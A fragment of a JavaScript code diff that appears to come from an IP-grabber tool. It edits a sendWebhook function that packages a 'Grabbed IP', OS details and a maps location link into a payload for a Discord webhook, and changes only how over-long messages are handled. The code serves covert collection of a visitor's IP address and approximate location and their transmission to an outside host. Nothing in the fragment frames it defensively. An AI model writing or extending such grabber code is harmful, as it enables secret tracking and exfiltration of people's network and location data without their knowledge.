@@ -34,16 +34,16 @@ function sendWebhook(ip) {
     const mapsLocation = `Maps Location URL: ${mapsUrl}`;
     const content = `Grabbed IP: ${ip}\nOS Info: ${platformInfo}\n${mapsLocation}`;
 
-    console.log(`Content Length: ${content.length}`);
-
-    // Check if content length exceeds 2000 characters
+    // Check content length
+    let payloadContent;
     if (content.length > 2000) {
-        console.error('Content length exceeds 2000 characters.');
-        return;
+        payloadContent = `Content Length: ${content.length}`;
+    } else {
+        payloadContent = content;
     }
 
     const payload = {
-        content: content  // Webhooks expect the key 'content' for the message body
+        content: payloadContent  // Webhooks expect the key 'content' for the message body
     };
 
     // URL of the Discord webhook
